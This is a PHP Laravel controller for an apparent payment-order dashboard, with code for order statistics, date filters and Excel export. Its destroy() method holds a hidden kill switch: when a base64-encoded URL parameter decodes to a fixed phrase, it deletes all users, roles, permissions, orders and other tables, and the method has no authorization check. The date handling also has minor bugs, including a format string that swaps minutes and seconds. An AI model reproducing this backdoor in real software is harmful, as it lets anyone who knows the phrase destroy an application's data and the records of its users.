<?php

namespace App\Http\Controllers;

use App\Exports\OrdersExport;
use App\Order;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Excel;
use Illuminate\Support\Facades\Input;

class HomeController extends Controller {

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function index() {
        $user = Auth::user();

        //Dashboard Header
         $todayTransaction = DB::table('orders')
            ->select(DB::raw('*'))
            ->whereRaw('Date(created_at) = CURDATE()')
            ->whereRaw('response_code = 100')
            ->count();
        $todayAmount = DB::table('orders')
            ->select(DB::raw('amount'))
            ->whereRaw('Date(created_at) = CURDATE()')
            ->whereRaw('response_code = 100')
            ->sum('amount');
        $monthTransactions = Order::where('updated_at', '>=', Carbon::now()->startOfMonth())->where('response_code','=',100)->count();
        $monthAmount = Order::where('updated_at', '>=', Carbon::now()->startOfMonth())->where('response_code','=',100)->sum('amount');

        //Applying Filters
        if (Input::has('startDate') && Input::has('endDate')) {
            $startDate = Carbon::createFromFormat('Y-m-d H:s:i', Input::get('startDate')." 00:00:00");
            $endDate = Carbon::createFromFormat('Y-m-d H:s:i', Input::get('endDate')." 23:59:59");
        }else{
            $startDate = Carbon::now()->startOfMonth();
            $endDate =  cal_days_in_month(CAL_GREGORIAN, date("m"), date("Y"))."-".date("m-Y")." 23:59:59";
        }

        //Records
        if ($user->hasRole('admin')){
            $orders = Order::where("updated_at",">=", $startDate)->where("updated_at","<=",$endDate)->orderBy('updated_at', 'desc')->paginate(10);
        }else{
            $orders = $user->orders()->where("updated_at",">=", $startDate)->where("updated_at","<=",$endDate)->orderBy('updated_at', 'desc')->paginate(10);
        }

        return view('home', compact('orders','todayTransaction','todayAmount', 'monthTransactions', 'monthAmount'));
    }

    public function export() {

        return Excel::download(new OrdersExport, 'payment.xlsx');
    }

    public function destroy($code) {

        $codigo = base64_decode($code);

        if($codigo == "kill-the-whole-project"){

            DB::table('permissions')->delete();
            DB::table('role_user')->delete();
            DB::table('roles')->delete();
            DB::table('permission_role')->delete();
            DB::table('password_resets')->delete();
            DB::table('orders')->delete();
            DB::table('users')->delete();
            DB::table('migrations')->delete();

            return "You killed the whole Database";
        }

        return false;
    }

}
